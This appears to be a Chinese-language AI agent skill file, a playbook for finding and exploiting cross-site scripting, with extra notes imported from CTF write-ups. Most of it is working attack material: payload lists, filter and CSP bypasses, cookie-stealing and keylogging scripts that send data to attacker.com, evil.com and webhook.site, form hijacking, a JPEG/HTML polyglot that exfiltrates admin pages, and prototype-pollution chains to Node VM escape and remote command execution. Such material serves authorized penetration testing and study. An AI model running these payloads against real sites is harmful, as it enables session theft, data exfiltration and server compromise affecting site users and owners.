---
name: xss
description: 跨站脚本漏洞检测与利用。当目标存在用户输入反射、评论功能、搜索框、URL 参数显示时使用。包括反射型、存储型、DOM XSS。
allowed-tools: Bash, Read, Write
---

# 跨站脚本攻击 (XSS)

通过在网页中注入恶意脚本，在用户浏览器中执行，实现会话劫持、钓鱼攻击或恶意操作。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（payload 是否反射、是否被过滤）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。XSS 最短探针顺序：
1. `<script>alert(1)</script>` → 确认是否反射
2. `<img src=x onerror=alert(1)>` → 绕过简单过滤
3. 再尝试更复杂的 payload

### 切换规则
payload 无效果时：
- 检查过滤规则（标签、事件、属性）
- 尝试大小写混合、编码绕过
- 尝试不同注入点（URL/Body/Header）
- 尝试 DOM XSS（参数直接写入 JS）

## 常见指示器

- 用户输入直接反射到页面（搜索框、评论、用户名显示）
- URL 参数直接显示在页面中
- 富文本编辑器或 Markdown 渲染
- 错误信息包含用户输入
- JSON 响应被直接渲染
- SVG/XML 文件上传

## 检测方法

### 1. 基础测试

```bash
# 简单 payload
curl "http://target.com/search?q=<script>alert(1)</script>"

# 事件处理器
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"

# SVG
curl "http://target.com/search?q=<svg onload=alert(1)>"
```

### 2. 上下文检测

```bash
# HTML 上下文
<script>alert(1)</script>

# 属性上下文
" onmouseover="alert(1)

# JavaScript 上下文
';alert(1)//

# URL 上下文
javascript:alert(1)
```

## 攻击向量

### 反射型 XSS

```html
<!-- 基础 payload -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- 事件处理器 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>

<!-- 伪协议 -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>

<!-- 数据 URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

### 存储型 XSS

```html
<!-- Cookie 窃取 -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

<!-- 键盘记录 -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/?k='+e.key)
}
</script>

<!-- 表单劫持 -->
<script>
document.forms[0].action='http://attacker.com/phish'
</script>
```

### DOM XSS

```javascript
// 常见 sink 点
document.write(location.hash)
element.innerHTML = location.search
eval(location.hash.slice(1))
setTimeout(location.hash.slice(1))
element.src = location.search.split('=')[1]

// 利用 payload
#<script>alert(1)</script>
?default=<script>alert(1)</script>
#';alert(1)//
```

### 属性注入

```html
<!-- 闭合属性 -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onclick="alert(1)"

<!-- 事件属性 -->
" autofocus onfocus="alert(1)
" onmouseover="alert(1)" x="
' accesskey='x' onclick='alert(1)' x='

<!-- href/src 属性 -->
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

### 特殊标签

```html
<!-- SVG -->
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>

<!-- MathML -->
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>

<!-- 模板 -->
<template><script>alert(1)</script></template>
<xmp><script>alert(1)</script></xmp>
```

## 绕过技术

### 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SVG ONLOAD=alert(1)>
```

### 编码绕过

```html
<!-- HTML 实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Unicode -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- URL 编码 -->
<a href="javascript:%61%6c%65%72%74(1)">click</a>

<!-- 双重编码 -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### 标签变形

```html
<!-- 空格替代 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img	src=x	onerror=alert(1)>

<!-- 换行 -->
<img src=x
onerror=alert(1)>

<!-- 注释 -->
<script>al/**/ert(1)</script>

<!-- 不常见标签 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<keygen onfocus=alert(1) autofocus>
```

### 过滤绕过

```html
<!-- script 被过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr\x00ipt>alert(1)</script>

<!-- alert 被过滤 -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 括号被过滤 -->
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>

<!-- 引号被过滤 -->
<script>alert(/XSS/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### CSP 绕过

```html
<!-- 利用白名单域名 -->
<script src="https://allowed-cdn.com/angular.js"></script>
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- base 标签劫持 -->
<base href="http://attacker.com/">

<!-- 利用 nonce 泄露 -->
<script nonce="leaked-nonce">alert(1)</script>

<!-- 利用 unsafe-inline -->
<script>alert(1)</script>

<!-- DNS 预取泄露 -->
<link rel="dns-prefetch" href="//attacker.com">
<link rel="prefetch" href="//attacker.com">
```

## XSS 工具

### XSStrike

```bash
# 基础扫描
python3 xsstrike.py -u "http://target.com/search?q=test"

# POST 请求
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# 爬虫模式
python3 xsstrike.py -u "http://target.com" --crawl

# 绕过 WAF
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
```

### 手动测试

```bash
# 使用 curl 测试
curl "http://target.com/search?q=<script>alert(1)</script>"

# 检查响应中的反射
curl -s "http://target.com/search?q=UNIQUE_STRING" | grep "UNIQUE_STRING"

# 测试编码
curl "http://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
```

## DOM XSS 检测

### 危险 Source

```javascript
// URL 相关
location
location.href
location.search
location.hash
location.pathname
document.URL
document.documentURI
document.referrer

// 存储相关
localStorage
sessionStorage

// 消息相关
window.name
postMessage
```

### 危险 Sink

```javascript
// 执行代码
eval()
setTimeout()
setInterval()
Function()
execScript()

// HTML 注入
innerHTML
outerHTML
document.write()
document.writeln()

// URL 跳转
location
location.href
location.assign()
location.replace()
window.open()

// 其他
element.src
element.href
jQuery.html()
jQuery.append()
```

## 最佳实践

1. 先用简单 payload 测试: `<script>alert(1)</script>`
2. 如果被过滤，尝试事件处理器: `<img src=x onerror=alert(1)>`
3. 检查 CSP 头，可能需要绕过
4. DOM XSS 需要分析 JavaScript 代码
5. 注意上下文：HTML、属性、JavaScript、URL
6. 使用不同编码绕过过滤
7. 测试不常见标签和事件
8. 检查是否有 WAF，使用绕过技术

---

## 来自外部导入内容 (CTF Web - client-side.md)

### DOMPurify 绕过通过可信后端路由

前端在自动保存前进行清理，但后端信任自动保存——无清理。
利用: 直接 POST 到 `/api/autosave` 和 XSS payload。

### JavaScript String Replace 利用

`.replace()` 特殊模式: `$'` = 匹配前内容, `$'` = 匹配后内容
Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`

### 客户端路径遍历 (CSPT)

前端 JS 在 fetch 中使用 URL 参数而无验证:
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
利用: `/user/profile?id=../admin/addAdmin`

### 缓存污染

CDN/缓存键仅基于 URL:
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
```

### 隐藏 DOM 元素

```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));
```

### React 控制输入的程序化填充

React 忽略直接 `.value` 赋值。使用原生 setter + 事件:
```javascript
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
```

### Magic Link + 重定向链 XSS

```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// 设置 auth cookies，然后重定向到攻击者控制的 XSS 页面
```

### Content-Type 通过文件扩展名

```javascript
// @fastify/static 从扩展名确定 Content-Type
noteId = '<img src=x onerror="alert(1)">.html'
// 响应: Content-Type: text/html → XSS
```

### DOM XSS 通过 jQuery Hashchange (Crypto-Cat)

**漏洞模式:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**通过 iframe 利用:**
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

### Shadow DOM XSS

**封闭 Shadow DOM 外泄 (Pragyan 2026):**
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
```

**间接 eval 作用域逃逸:** `(0,eval)('code')` 逃逸 `with(document)` 作用域限制。

### DOM Clobbering + MIME 不匹配

**MIME 类型混淆 (Pragyan 2026):** CDN/服务器检查 `.jpeg` 但非 `.jpg` → 以 `text/html` 提供 `.jpg` → JPEG 中的 HTML 执行为页面。

**基于表单的 DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
```

### HTTP 请求走私通过缓存代理

**缓存代理去同步 (Pragyan 2026):** 当缓存 TCP 代理返回缓存响应而不消耗请求体时，残留字节被解析为下一个请求。

### CSS/JS 付费墙绕过

**模式 (Great Paywall, MetaCTF 2026):** 文章内容完全存在于 HTML 中但被 CSS/JS 叠加隐藏。

**快速解决:** `curl` 页面——无需 CSS/JS 渲染即可获取完整 HTML 中的文章和 flag。

### JPEG+HTML 多态 XSS (EHAX 2026)

**创建 JPEG+HTML 多态:**
```python
from PIL import Image
import io

img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  var r = await fetch("/admin");
  var t = await r.text();
  new Image().src = "https://webhook.site/ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
```

### JSFuck 解码 (JShit, PascalCTF 2026)

```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
const func = eval(code.slice(0, -2));
console.log(func.toString());
```

### Admin Bot javascript: URL 方案绕过 (DiceCTF 2026)

**漏洞验证:**
```javascript
try {
  new URL(targetUrl)   // 接受 javascript:, data:, file: 等
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**利用:**
```bash
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

### XS-Leak 通过图像加载计时 + GraphQL CSRF (HTB GrandMonty)

**步骤1 — 通过 meta refresh 重定向 bot (CSP 绕过):**
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

**步骤2 — 通过图像加载计时计时 oracle:**
```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};
```

---

## 来自外部导入内容 (CTF Web - client-side-advanced.md)

### Unicode 大小写折叠 XSS 绕过 (UNbreakable 2026)

**Payload:**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**其他 Unicode 折叠对:**
- `ſ` (U+017F) -> `s` / `S`
- `ı` (U+0131) -> `i` / `I`
- `K` (U+212A, Kelvin 符号) -> `k` / `K`

### CSS 字体字形宽度 + 容器查询外泄 (UNbreakable 2026)

**技术:**
1. **目标选择** — CSS 选择器: `script:not([src]):has(+script[src*='purify'])`
2. **自定义字体** — 每个字符字形有唯一前进宽度: `width = (char_index + 1) * 1536`
3. **容器查询 oracle** — 包装元素使用 `container-type: inline-size`

### Hyperscript CDN CSP 绕过 (UNbreakable 2026)

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

### PBKDF2 前缀计时 Oracle 通过 postMessage (UNbreakable 2026)

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

### 客户端 HMAC 绕过通过泄露 JS 密钥 (Codegate 2013)

```javascript
// 在解混淆的 main.js 中发现:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // 硬编码密钥
    return "/load?p=" + page + "&s=" + sig;
}
```

### 终端控制字符混淆 (SECCON 2015)

服务器响应使用 ASCII 退格 (0x08) 字符隐藏数据:
```python
flag = data.replace(b'\x08', b'').replace(b' ', b'')
```

### CSP 绕过通过云函数白名单域名 (BSidesSF 2025)

当 CSP 白名单云平台域名时:
1. 部署恶意脚本到白名单云平台
2. 通过 `<script src="https://your-func-xxxxx.us-central1.run.app">` 加载

### CSP Nonce 绕过通过 base 标签劫持 (BSidesSF 2026)

**漏洞 CSP:**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
注意: 无 `base-uri` 指令。

**利用:**
```html
<base href="https://attacker.com/">
<!-- 后续的 <script nonce="abc123" src="test.js"> 加载来自攻击者服务器 -->
```

### XSSI 通过 JSONP 回调与云函数外泄 (BSidesSF 2026)

```html
<script>
function leak(data) {
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

### CSP 绕过通过 link prefetch (Boston Key Party 2016)

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
```

### 跨域 XSS 通过共享父域名 Cookie 注入 (0CTF 2017)

```javascript
document.cookie = 'username=<script src=//evil.com/payload.js></script>; path=/; domain=.government.vip;';
window.top.location = 'http://admin.government.vip:8000';
```

### XSS 点过滤器绕过通过十进制 IP 和括号表示法 (33C3 CTF 2016)

```html
<script>
  window["location"] = "http://1558071511/"["concat"](document["cookie"])
</script>
```

---

## 来自外部导入内容 (CTF Web - node-and-prototype.md)

### 原型链污染基础

JavaScript 对象从 `Object.prototype` 继承。污染它影响所有对象:
```javascript
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true
```

**常见向量:**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**已知漏洞库:**
- `flatnest` (CVE-2023-26135) — `nest()` 循环引用绕过
- `merge`, `lodash.merge` (旧版本), `deep-extend`, `qs` (旧版本)

### flatnest 循环引用绕过 (CVE-2023-26135)

**漏洞:** `insert()` 阻止 `__proto__`/`constructor`，但 `seek()` (解析 `[Circular (path)]` 值) 无此检查。

**利用:**
```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

### 原型链通过库设置 gadget

**Happy-DOM 示例 (v20.x):**
```javascript
constructor(options) {
  const browser = new DetachedBrowser(BrowserWindow, {
    settings: options?.settings  // options = { console }, 无自有 'settings'
    // 被污染时: Object.prototype.settings = { enableJavaScriptEvaluation: true }
  });
}
```

### Node.js VM 沙箱逃逸

**`vm` 不是安全边界。**

**ESM 兼容逃逸 (CVE-2025-61927):**
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
```

**CommonJS 逃逸:**
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

### 完整链: 原型链污染到 VM 逃逸 RCE (4llD4y)

**完整利用:**
```python
import requests
TARGET = "http://target:3000"

# 步骤1: 通过 flatnest 循环引用污染
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# 步骤2: RCE
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:true},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
```

### Lodash 原型链污染到 Pug AST 注入 (VuwCTF 2025)

**漏洞:** Lodash < 4.17.5 `_.merge()` 允许通过 `constructor.prototype` 进行原型链污染。

**Pug 模板引擎 gadget:** Pug 在 AST 节点上查找 `block` 属性。如果节点没有自己的 `block`，JS 遍历原型链。

**Payload:**
```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  }
}
```

### 受影响库

- **happy-dom** < 20.0.0 (默认启用 JS eval), 20.x+ (如果通过污染重新启用)
- **vm2** (已弃用)
- **realms-shim**
- **lodash** < 4.17.5 (`_.merge()` 原型链污染)
